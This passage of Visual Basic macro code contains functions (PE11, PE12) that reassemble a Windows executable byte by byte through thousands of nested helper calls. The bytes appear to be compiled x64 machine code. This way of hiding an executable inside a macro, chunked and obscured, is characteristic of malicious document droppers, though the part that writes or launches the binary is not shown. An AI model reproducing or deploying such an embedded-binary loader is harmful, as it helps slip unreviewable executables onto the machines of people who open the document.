    strPE = A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(strPE, 20), "L"), 137), 192), "H"), 131), 196), " [^_]A\"), 195), 15), 31), 128), 0), 0), 0), 0), 191), 0), 0), 0), 0), 15), 137), 212), 254), 255), 255), "H"), 137), 240), 191), 1), 0), 0), 0), "H"), 137), 222), "H"), 137), 195), 233), 193), 254)
    strPE = A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(strPE, 255), 255), "f"), 144), "1"), 201), 232), 185), 246), 255), 255), "I"), 137), 192), "H"), 133), 192), "t"), 188), "L"), 137), 192), "I"), 199), "@"), 20), 1), 0), 0), 0), "H"), 131), 196), " [^_]A\"), 195), "ff."), 15), 31), 132), 0), 0), 0)
    strPE = A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(strPE, 0), 0), "ATSHcA"), 20), "L"), 141), "Y"), 24), "I"), 137), 212), 185), " "), 0), 0), 0), "M"), 141), 12), 131), 137), 200), "E"), 139), "A"), 252), "M"), 141), "Q"), 252), "A"), 15), 189), 208), 131), 242), 31), ")"), 208), "A"), 137), 4), "$"), 131), 250)
    strPE = A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 10), 15), 142), 137), 0), 0), 0), 131), 234), 11), "M9"), 211), "saE"), 139), "Q"), 248), 133), 210), "t`"), 137), 203), "D"), 137), 192), 137), 209), "E"), 137), 208), ")"), 211), 211), 224), 137), 217), "A"), 211), 232), 137), 209), "I"), 141), "Q"), 248), "D"), 9)
    strPE = A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(strPE, 192), "A"), 211), 226), 13), 0), 0), 240), "?H"), 193), 224), " I9"), 211), "s"), 11), "A"), 139), "Q"), 244), 137), 217), 211), 234), "A"), 9), 210), "H"), 186), 0), 0), 0), 0), 255), 255), 255), 255), "H!"), 208), "L"), 9), 208), "fH"), 15), "n"), 192)
    strPE = B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(strPE, "[A\"), 195), 15), 31), 132), 0), 0), 0), 0), 0), "E1"), 210), 133), 210), "uYD"), 137), 192), 13), 0), 0), 240), "?H"), 193), 224), " L"), 9), 208), "fH"), 15), "n"), 192), "[A\"), 195), 144), 185), 11), 0), 0), 0), "D")
    strPE = B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(strPE, 137), 192), "1"), 219), ")"), 209), 211), 232), 13), 0), 0), 240), "?H"), 193), 224), " M9"), 211), "s"), 6), "A"), 139), "Y"), 248), 211), 235), 141), "J"), 21), "A"), 211), 224), "A"), 9), 216), "L"), 9), 192), "fH"), 15), "n"), 192), "[A\"), 195), "f")
    strPE = A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 15), 31), 132), 0), 0), 0), 0), 0), "D"), 137), 192), 137), 209), "E1"), 210), 211), 224), 13), 0), 0), 240), "?H"), 193), 224), " "), 233), "g"), 255), 255), 255), 15), 31), 132), 0), 0), 0), 0), 0), "WVSH"), 131), 236), " "), 185), 1), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(strPE, 0), 0), "fH"), 15), "~"), 195), "H"), 137), 215), "L"), 137), 198), 232), "T"), 245), 255), 255), "I"), 137), 194), "H"), 133), 192), 15), 132), 142), 0), 0), 0), "H"), 137), 217), "H"), 137), 216), "H"), 193), 233), " "), 137), 202), 193), 233), 20), 129), 226), 255), 255), 15)
    strPE = A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(strPE, 0), "A"), 137), 209), "A"), 129), 201), 0), 0), 16), 0), 129), 225), 255), 7), 0), 0), "A"), 15), "E"), 209), "A"), 137), 200), 133), 219), "tpE1"), 201), 243), "D"), 15), 188), 203), "D"), 137), 201), 211), 232), "E"), 133), 201), "t"), 19), 185), " "), 0), 0)
    strPE = B(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(strPE, 0), 137), 211), "D)"), 201), 211), 227), "D"), 137), 201), 9), 216), 211), 234), "A"), 137), "B"), 24), 131), 250), 1), 184), 1), 0), 0), 0), 131), 216), 255), "A"), 137), "R"), 28), "A"), 137), "B"), 20), "E"), 133), 192), "uQHc"), 208), 193), 224), 5), "A")
    strPE = A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(strPE, 129), 233), "2"), 4), 0), 0), "A"), 15), 189), "T"), 146), 20), "D"), 137), 15), 131), 242), 31), ")"), 208), 137), 6), "L"), 137), 208), "H"), 131), 196), " [^_"), 195), 15), 31), 128), 0), 0), 0), 0), "1"), 201), "A"), 199), "B"), 20), 1), 0), 0), 0)
    strPE = A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(strPE, 184), 1), 0), 0), 0), 243), 15), 188), 202), 211), 234), "D"), 141), "I A"), 137), "R"), 24), "E"), 133), 192), "t"), 175), "C"), 141), 132), 8), 205), 251), 255), 255), 137), 7), 184), "5"), 0), 0), 0), "D)"), 200), 137), 6), "L"), 137), 208), "H"), 131), 196)
    strPE = A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(strPE, " [^_"), 195), 15), 31), 128), 0), 0), 0), 0), "H"), 137), 200), "H"), 137), 209), "H"), 141), "R"), 1), 15), 182), 9), 136), 8), 132), 201), "t"), 22), 15), 31), "D"), 0), 0), 15), 182), 10), "H"), 131), 192), 1), "H"), 131), 194), 1), 136), 8), 132)
    strPE = A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(strPE, 201), "u"), 239), 195), 144), 144), 144), 144), 144), 144), "E1"), 192), "H"), 137), 200), "H"), 133), 210), "u"), 20), 235), 23), 15), 31), 0), "H"), 131), 192), 1), "I"), 137), 192), "I)"), 200), "I9"), 208), "s"), 5), 128), "8"), 0), "u"), 236), "L"), 137), 192), 195)
    strPE = A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(strPE, 144), 144), 144), 144), 144), 144), 144), 144), "1"), 192), "I"), 137), 208), "H"), 133), 210), "u"), 15), 235), 23), 15), 31), "@"), 0), "H"), 131), 192), 1), "I9"), 192), "t"), 10), "f"), 131), "<A"), 0), "u"), 240), "I"), 137), 192), "L"), 137), 192), 195), 144), 144), 144)
    strPE = B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 144), 144), 144), 144), 144), 144), 255), "%*k"), 0), 0), 144), 144), 255), "%"), 26), "k"), 0), 0), 144), 144), 255), "%"), 10), "k"), 0), 0), 144), 144), 255), "%"), 250), "j"), 0), 0), 144), 144), 255), "%"), 234), "j"), 0), 0), 144), 144), 255), "%"), 218), "j")
    strPE = A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(strPE, 0), 0), 144), 144), 255), "%"), 202), "j"), 0), 0), 144), 144), 255), "%"), 186), "j"), 0), 0), 144), 144), 255), "%"), 170), "j"), 0), 0), 144), 144), 255), "%"), 154), "j"), 0), 0), 144), 144), 255), "%"), 138), "j"), 0), 0), 144), 144), 255), "%zj"), 0), 0)
    strPE = A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(strPE, 144), 144), 255), "%jj"), 0), 0), 144), 144), 255), "%Zj"), 0), 0), 144), 144), 255), "%Jj"), 0), 0), 144), 144), 255), "%:j"), 0), 0), 144), 144), 255), "%*j"), 0), 0), 144), 144), 255), "%"), 26), "j"), 0), 0), 144), 144)
    strPE = B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(strPE, 255), "%"), 2), "j"), 0), 0), 144), 144), 255), "%"), 234), "i"), 0), 0), 144), 144), 255), "%"), 210), "i"), 0), 0), 144), 144), 255), "%"), 186), "i"), 0), 0), 144), 144), 255), "%"), 170), "i"), 0), 0), 144), 144), 255), "%"), 146), "i"), 0), 0), 144), 144), 255), "%")
    strPE = A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(strPE, 130), "i"), 0), 0), 144), 144), 255), "%ri"), 0), 0), 144), 144), 255), "%Ri"), 0), 0), 144), 144), 255), "%2i"), 0), 0), 144), 144), "WSH"), 131), 236), "HH"), 137), 207), "H"), 137), 211), "H"), 133), 210), 15), 132), "3"), 1), 0)
    strPE = A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(strPE, 0), "M"), 133), 192), 15), 132), "3"), 1), 0), 0), "A"), 139), 1), 15), 182), 18), "A"), 199), 1), 0), 0), 0), 0), 137), "D$<"), 132), 210), 15), 132), 161), 0), 0), 0), 131), 188), "$"), 136), 0), 0), 0), 1), "vw"), 132), 192), 15), 133), 167)
    strPE = A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(strPE, 0), 0), 0), "L"), 137), "L$x"), 139), 140), "$"), 128), 0), 0), 0), "L"), 137), "D$p"), 255), 21), "ph"), 0), 0), 133), 192), "tTL"), 139), "D$pL"), 139), "L$xI"), 131), 248), 1), 15), 132), 245), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(strPE, "H"), 137), "|$ A"), 185), 2), 0), 0), 0), "I"), 137), 216), 199), "D$("), 1), 0), 0), 0), 139), 140), "$"), 128), 0), 0), 0), 186), 8), 0), 0), 0), 255), 21), "@h"), 0), 0), 133), 192), 15), 132), 176), 0), 0), 0), 184), 2)
    strPE = A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(strPE, 0), 0), 0), "H"), 131), 196), "H[_"), 195), 15), 31), "@"), 0), 139), 132), "$"), 128), 0), 0), 0), 133), 192), "uM"), 15), 182), 3), "f"), 137), 7), 184), 1), 0), 0), 0), "H"), 131), 196), "H[_"), 195), 15), 31), 0), "1"), 210), "1"), 192)
    strPE = A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(strPE, "f"), 137), 17), "H"), 131), 196), "H[_"), 195), "f."), 15), 31), 132), 0), 0), 0), 0), 0), 136), "T$=A"), 185), 2), 0), 0), 0), "L"), 141), "D$<"), 199), "D$("), 1), 0), 0), 0), "H"), 137), "L$ "), 235), 128)
    strPE = A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(strPE, "f"), 144), 199), "D$("), 1), 0), 0), 0), 139), 140), "$"), 128), 0), 0), 0), "I"), 137), 216), "A"), 185), 1), 0), 0), 0), "H"), 137), "|$ "), 186), 8), 0), 0), 0), 255), 21), 168), "g"), 0), 0), 133), 192), "t"), 28), 184), 1), 0), 0)
    strPE = A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(strPE, 0), 235), 156), 15), 31), "D"), 0), 0), "1"), 192), "H"), 131), 196), "H[_"), 195), 184), 254), 255), 255), 255), 235), 135), 232), "c"), 254), 255), 255), 199), 0), "*"), 0), 0), 0), 184), 255), 255), 255), 255), 233), "r"), 255), 255), 255), 15), 182), 3), "A"), 136)
    strPE = A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 1), 184), 254), 255), 255), 255), 233), "b"), 255), 255), 255), 15), 31), 0), "AUATWVSH"), 131), 236), "@1"), 192), "I"), 137), 204), "H"), 133), 201), "f"), 137), "D$>H"), 141), "D$>L"), 137), 203), "L"), 15), "D"), 224)
    strPE = A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(strPE, "I"), 137), 213), "L"), 137), 198), 232), 233), 4), 0), 0), 137), 199), 232), 234), 4), 0), 0), "H"), 133), 219), 137), "|$(I"), 137), 240), 137), "D$ L"), 141), 13), 13), "`"), 0), 0), "L"), 137), 234), "L"), 137), 225), "L"), 15), "E"), 203), 232)
    strPE = A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(strPE, "&"), 254), 255), 255), "H"), 152), "H"), 131), 196), "@[^_A\A]"), 195), 15), 31), 132), 0), 0), 0), 0), 0), "AVAUATUWVSH"), 131), 236), "@H"), 141), 5), 207), "_"), 0), 0), "M"), 137), 205)
    strPE = A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(strPE, "M"), 133), 201), "I"), 137), 206), "H"), 137), 211), "L"), 15), "D"), 232), "L"), 137), 198), 232), 131), 4), 0), 0), 137), 197), 232), "t"), 4), 0), 0), 137), 199), "H"), 133), 219), 15), 132), 193), 0), 0), 0), "H"), 139), 19), "H"), 133), 210), 15), 132), 181), 0), 0)
    strPE = B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(strPE, 0), "M"), 133), 246), "tpE1"), 228), "H"), 133), 246), "u"), 31), 235), "Jf"), 15), 31), "D"), 0), 0), "H"), 139), 19), "H"), 152), "I"), 131), 198), 2), "I"), 1), 196), "H"), 1), 194), "H"), 137), 19), "L9"), 230), "v-"), 137), "|$(I")
    strPE = B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(strPE, 137), 240), "M"), 137), 233), "L"), 137), 241), 137), "l$ M)"), 224), 232), 128), 253), 255), 255), 133), 192), 127), 204), "L9"), 230), "v"), 11), 133), 192), "u"), 7), "H"), 199), 3), 0), 0), 0), 0), "L"), 137), 224), "H"), 131), 196), "@[^_")
    strPE = A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(strPE, "]A\A]A^"), 195), "f."), 15), 31), 132), 0), 0), 0), 0), 0), "1"), 192), "A"), 137), 254), "H"), 141), "t$>E1"), 228), "f"), 137), "D$>"), 235), 12), 15), 31), "@"), 0), "H"), 152), "H"), 139), 19), "I"), 1), 196)
    strPE = B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(strPE, 137), "|$(L"), 1), 226), "M"), 137), 233), "M"), 137), 240), 137), "l$ H"), 137), 241), 232), 23), 253), 255), 255), 133), 192), 127), 219), 235), 165), 144), "E1"), 228), 235), 159), "ff."), 15), 31), 132), 0), 0), 0), 0), 0), "AT")
    strPE = B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(strPE, "WVSH"), 131), 236), "H1"), 192), "I"), 137), 204), "H"), 137), 214), "L"), 137), 195), "f"), 137), "D$>"), 232), "z"), 3), 0), 0), 137), 199), 232), "{"), 3), 0), 0), "H"), 133), 219), 137), "|$(I"), 137), 240), "H"), 141), 21), 154), "^")
    strPE = A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(strPE, 0), 0), 137), "D$ H"), 141), "L$>H"), 15), "D"), 218), "L"), 137), 226), "I"), 137), 217), 232), 178), 252), 255), 255), "H"), 152), "H"), 131), 196), "H[^_A\"), 195), 144), 144), 144), 144), 144), 144), "H"), 131), 236), "XH"), 137)
    strPE = B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(strPE, 200), "f"), 137), "T$hD"), 137), 193), "E"), 133), 192), "u"), 28), "f"), 129), 250), 255), 0), "wY"), 136), 16), 184), 1), 0), 0), 0), "H"), 131), 196), "X"), 195), "f"), 15), 31), 132), 0), 0), 0), 0), 0), "H"), 141), "T$LD"), 137), "L")
    strPE = A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(strPE, "$(L"), 141), "D$hA"), 185), 1), 0), 0), 0), "H"), 137), "T$81"), 210), 199), "D$L"), 0), 0), 0), 0), "H"), 199), "D$0"), 0), 0), 0), 0), "H"), 137), "D$ "), 255), 21), "Xe"), 0), 0), 133), 192)
    strPE = B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(strPE, "t"), 8), 139), "T$L"), 133), 210), "t"), 174), 232), 231), 251), 255), 255), 199), 0), "*"), 0), 0), 0), 184), 255), 255), 255), 255), "H"), 131), 196), "X"), 195), 15), 31), 128), 0), 0), 0), 0), "ATVSH"), 131), 236), "0H"), 133), 201), "I")
    strPE = B(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(strPE, 137), 204), "H"), 141), "D$+"), 137), 211), "L"), 15), "D"), 224), 232), 138), 2), 0), 0), 137), 198), 232), 139), 2), 0), 0), 15), 183), 211), "A"), 137), 241), "L"), 137), 225), "A"), 137), 192), 232), ":"), 255), 255), 255), "H"), 152), "H"), 131), 196), "0[^")
    strPE = A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "A\"), 195), "ff."), 15), 31), 132), 0), 0), 0), 0), 0), 15), 31), "@"), 0), "AVAUATUWVSH"), 131), 236), "0E1"), 246), "I"), 137), 212), "H"), 137), 203), "L"), 137), 197), 232), "A"), 2), 0), 0), 137)
    strPE = B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(strPE, 199), 232), "2"), 2), 0), 0), "I"), 139), "4$A"), 137), 197), "H"), 133), 246), "tMH"), 133), 219), "taH"), 133), 237), "u'"), 233), 143), 0), 0), 0), 15), 31), 128), 0), 0), 0), 0), "H"), 152), "H"), 1), 195), "I"), 1), 198), 128), "{")
    strPE = A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 255), 0), 15), 132), 134), 0), 0), 0), "H"), 131), 198), 2), "L9"), 245), "vm"), 15), 183), 22), "E"), 137), 233), "A"), 137), 248), "H"), 137), 217), 232), 172), 254), 255), 255), 133), 192), 127), 208), "I"), 199), 198), 255), 255), 255), 255), "L"), 137), 240), "H"), 131)
    strPE = A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(strPE, 196), "0[^_]A\A]A^"), 195), 15), 31), 128), 0), 0), 0), 0), "H"), 141), "l$+"), 235), 23), 144), "Hc"), 208), 131), 232), 1), "H"), 152), "I"), 1), 214), 128), "|"), 4), "+"), 0), "t>H"), 131), 198), 2)
    strPE = A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(strPE, 15), 183), 22), "E"), 137), 233), "A"), 137), 248), "H"), 137), 233), 232), "Y"), 254), 255), 255), 133), 192), 127), 213), 235), 171), 15), 31), 0), "I"), 137), "4$"), 235), 169), "f."), 15), 31), 132), 0), 0), 0), 0), 0), "I"), 199), 4), "$"), 0), 0), 0), 0)

    PE11 = strPE
End Function

Private Function PE12() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(strPE, "I"), 131), 238), 1), 235), 145), "f"), 144), "I"), 131), 238), 1), 235), 137), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), "SH"), 131), 236), " "), 137), 203), 232), "D"), 1), 0), 0), 137), 217), "H"), 141), 20), "IH"), 193), 226), 4), "H"), 1), 208), "H")
    strPE = A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(strPE, 131), 196), " ["), 195), 144), "H"), 139), 5), "y\"), 0), 0), 195), 15), 31), 132), 0), 0), 0), 0), 0), "H"), 137), 200), "H"), 135), 5), "f\"), 0), 0), 195), 144), 144), 144), 144), 144), "SH"), 131), 236), " H"), 137), 203), "1"), 201), 232), 177)
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(strPE, 255), 255), 255), "H9"), 195), "r"), 15), 185), 19), 0), 0), 0), 232), 162), 255), 255), 255), "H9"), 195), "v"), 21), "H"), 141), "K0H"), 131), 196), " [H"), 255), "%"), 221), "b"), 0), 0), 15), 31), "D"), 0), 0), "1"), 201), 232), 129), 255), 255)
    strPE = A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(strPE, 255), "I"), 137), 192), "H"), 137), 216), "L)"), 192), "H"), 193), 248), 4), "i"), 192), 171), 170), 170), 170), 141), "H"), 16), 232), 174), 0), 0), 0), 129), "K"), 24), 0), 128), 0), 0), "H"), 131), 196), " ["), 195), "f"), 15), 31), 132), 0), 0), 0), 0), 0)
    strPE = A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(strPE, "SH"), 131), 236), " H"), 137), 203), "1"), 201), 232), "A"), 255), 255), 255), "H9"), 195), "r"), 15), 185), 19), 0), 0), 0), 232), "2"), 255), 255), 255), "H9"), 195), "v"), 21), "H"), 141), "K0H"), 131), 196), " [H"), 255), "%"), 181), "b"), 0)
    strPE = A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(strPE, 0), 15), 31), "D"), 0), 0), 129), "c"), 24), 255), 127), 255), 255), "1"), 201), 232), 10), 255), 255), 255), "H)"), 195), "H"), 193), 251), 4), "i"), 219), 171), 170), 170), 170), 141), "K"), 16), "H"), 131), 196), " ["), 233), "0"), 0), 0), 0), "H"), 139), 5), 249)
    strPE = A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(strPE, "("), 0), 0), "H"), 139), 0), 195), 144), 144), 144), 144), 144), "H"), 139), 5), 249), "("), 0), 0), "H"), 139), 0), 195), 144), 144), 144), 144), 144), "H"), 139), 5), 249), "("), 0), 0), "H"), 139), 0), 195), 144), 144), 144), 144), 144), 255), "%:c"), 0), 0)
    strPE = A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(strPE, 144), 144), 255), "%"), 34), "c"), 0), 0), 144), 144), 255), "%"), 194), "b"), 0), 0), 144), 144), 255), "%"), 162), "b"), 0), 0), 144), 144), 255), "%"), 146), "b"), 0), 0), 144), 144), 15), 31), 132), 0), 0), 0), 0), 0), 255), "%"), 170), "c"), 0), 0), 144), 144)
    strPE = B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 15), 31), 132), 0), 0), 0), 0), 0), 255), "%Zb"), 0), 0), 144), 144), 255), "%Jb"), 0), 0), 144), 144), 255), "%:b"), 0), 0), 144), 144), 255), "%*b"), 0), 0), 144), 144), 255), "%"), 26), "b"), 0), 0), 144), 144), 255), "%")
    strPE = B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(strPE, 10), "b"), 0), 0), 144), 144), 255), "%"), 250), "a"), 0), 0), 144), 144), 255), "%"), 234), "a"), 0), 0), 144), 144), 255), "%"), 218), "a"), 0), 0), 144), 144), 255), "%"), 202), "a"), 0), 0), 144), 144), 255), "%"), 186), "a"), 0), 0), 144), 144), 255), "%"), 170), "a")
    strPE = A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(strPE, 0), 0), 144), 144), 255), "%"), 154), "a"), 0), 0), 144), 144), 255), "%"), 138), "a"), 0), 0), 144), 144), 255), "%za"), 0), 0), 144), 144), 255), "%ja"), 0), 0), 144), 144), 255), "%Za"), 0), 0), 144), 144), 255), "%Ja"), 0), 0)
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(strPE, 144), 144), 255), "%:a"), 0), 0), 144), 144), 255), "%*a"), 0), 0), 144), 144), 233), 11), 148), 255), 255), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 255), 255), 255), 255), 255), 255), 255), 255), 16), 129), "@"), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 255), 255), 255), 255), 255), 255), 255), 255), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
